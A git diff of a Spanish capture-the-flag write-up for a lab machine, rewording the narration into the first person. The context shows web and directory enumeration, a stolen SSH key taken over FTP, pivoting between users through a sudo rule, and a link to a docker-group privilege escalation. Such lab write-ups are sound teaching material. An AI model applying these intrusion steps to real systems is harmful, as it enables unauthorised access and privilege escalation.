@@ -64,7 +64,7 @@ Si miramos el código fuente tenemos otro mensaje:
      She sings very well. l loved it  -->
 ```
 ### Robots.txt
-Analizamos el fichero robots.txt con curl, tenemos un directorio llamado `/nothing`
+Analizo el fichero robots.txt con curl, existe un directorio llamado `/nothing`
 ```bash
 ❯ curl -s http://192.168.1.54/robots.txt
 # Group 1
@@ -73,7 +73,7 @@ User-agent: *
 Allow: /nothing
 ```
 
-Usamos de nuevo curl con html2text para ver el contenido del directorio `/nothing`, dentro de `/nothing` hay el archivo `nothing.html`
+Utilizo curl de nuevo con html2text para ver el contenido del directorio `/nothing`, dentro de `/nothing` hay el archivo `nothing.html`
 ```bash
 ❯ curl -s http://192.168.1.54/nothing/ | html2text
 ****** Index of /nothing ******
@@ -119,7 +119,7 @@ El archivo secret.dic es un diccionario de directorios.
 
 ![](/assets/images/hmvm-Pwned/secretDic.png)
 
-Nos descargamos el diccionario.
+Descargo el diccionario secret.
 ```bash
 ❯ wget http://192.168.1.54/hidden_text/secret.dic
 --2021-09-20 15:51:22--  http://192.168.1.54/hidden_text/secret.dic
@@ -129,7 +129,7 @@ Longitud: 211
 Grabando a: «secret.dic»
 ```
 
-Volvemos a wfuzz y le añadimos el diccionario `secret.dic`
+Vuelvo a lanzar wfuzz con el nuevo diccionario.
 ```bash
 ❯ wfuzz -c -t 50 --hc=404 -w /opt/w/secret.dic http://192.168.1.54/FUZZ
 ********************************************************
@@ -146,10 +146,10 @@ ID           Response   Lines    Word       Chars       Payload
 000000017:   301        9 L      28 W       317 Ch      "/pwned.vuln"
 ```
 
-Vamos a `http://192.168.1.54/pwned.vuln/` y vemos lo siguiente:
+Me desplazo a `http://192.168.1.54/pwned.vuln/` y veo lo siguiente:
 ![](/assets/images/hmvm-Pwned/pwnedvuln.png)
 
-Observamos esto en el código fuente de la web.
+Observo esto en el código fuente de la web.
 
 ![](/assets/images/hmvm-Pwned/cfuenteweb.png)
 
@@ -168,10 +168,10 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp> 
 ```
-Una vez logueados, vemos un directorio llamado `/share` dentro de `/share` vemos los siguientes archivos:
+Una vez logueado, veo un directorio llamado `/share` dentro de `/share` veo los siguientes archivos:
 ![](/assets/images/hmvm-Pwned/ftp.png)
 
-Los descargamos.
+Los descargo.
 ```bash
 ftp> get id_rsa 
 local: id_rsa remote: id_rsa
@@ -183,16 +183,16 @@ local: note.txt remote: note.txt
 ```
 
 ### Archivo note.txt
-Aquí tenemos un nombre de usuario `ariana` que usaremos con la llave `id_rsa`
+Aquí tenemos un nombre de usuario `ariana` que usaré con la llave `id_rsa`
 ![](/assets/images/hmvm-Pwned/notetxt.png)
 
-Damos permisos al `id_rsa` y nos conectamos al `SSH`
+Con chmod doy permisos al `id_rsa` y me conecto al SSH.
 ```bash
 ❯ chmod 600 id_rsa
 ❯ ssh -i id_rsa ariana@192.168.1.54
 ```
 
-Una vez conectados como ariana leemos la flag de user1.
+Una vez conectado como ariana puedo leer la flag de user1.
 ```bash
 ariana@pwned:~$ cat user1.txt 
 congratulations you Pwned ariana 
@@ -203,7 +203,7 @@ fb8d98be1xxxxxxxxxxxxxxxxx2140
 
 Try harder.need become root
 ```
-Leemos el fichero ariana-personal.diary.
+Leo el fichero ariana-personal.diary.
 
 ```
 ariana@pwned:~$ cat ariana-personal.diary 
@@ -212,11 +212,11 @@ Its Ariana personal Diary :::
 Today Selena fight with me for Ajay. so i opened her hidden_text on server. now she resposible for the issue.
 ```
 
-Tenemos a Selena otro posible usuario, pero veamos cuantos usuarios tiene la máquina:
+Selena otro posible usuario, pero veamos cuantos usuarios tiene la máquina:
 ![](/assets/images/hmvm-Pwned/usuarios.png)
 
 ### User Pivoting
-Comprobamos los comandos que se pueden ejecutar como sudo.
+Compruebo los comandos que se pueden ejecutar como sudo.
 ```bash
 ariana@pwned:~$ sudo -l
 Matching Defaults entries for ariana on pwned:
@@ -225,26 +225,26 @@ Matching Defaults entries for ariana on pwned:
 User ariana may run the following commands on pwned:
     (selena) NOPASSWD: /home/messenger.sh
 ```
-El usuario selena puede lanzar `/home/messenger.sh` sin poner la contraseña, veamos los permisos que tiene.
+El usuario selena puede lanzar `/home/messenger.sh` sin poner la contraseña.
 ```bash
 ariana@pwned:~$ ls -la /home/messenger.sh 
 -rwxr-xr-x 1 root root 367 Jul 10  2020 /home/messenger.sh
 ```
-Vemos que `otros`pueden ejecutar `/messenger.sh`, abrimos `/messenger.sh` con nano para ver el código:
+Con nano abro `/messenger.sh` para ver el código:
 ![](/assets/images/hmvm-Pwned/messengersh.png)
 
-Lanzamos `/messenger.sh` como selena
+Lanzo `/messenger.sh` como selena
 ```bash
 ariana@pwned:~$ sudo -u selena /home/messenger.sh
 ```
 ![](/assets/images/hmvm-Pwned/aritoselena.png)
 
-Tenemos una shell con selena pero no es funcional del todo. Para arreglar este pequeño problema escribiremos:
+Tengo una shell con selena pero no es funcional del todo. Para arreglar este pequeño problema escribiremos:
 ```bash
 script /dev/null -c bash
 ```
 
-Nos vamos al home de selena y allí podemos leer el user2.
+Me voy home de selena y allí puedo leer el user2.
 ```bash
 selena@pwned:~$ cat user2.txt 
 711fxxxxxxxxxxxxxxxxxxxxf295c176
@@ -255,15 +255,13 @@ Try harder to catch me
 ```
 
 ### Privesc
-Con id vemos que selena está en el grupo de docker.
+Con id veo que selena está en el grupo de docker.
 ```bash
 selena@pwned:~$ id
 uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
 selena@pwned:~$ groups
 selena docker
 ```
-
-
 El exploit que he utilizado lo he descargado de:
  
 > https://fosterelli.co/privilege-escalation-via-docker
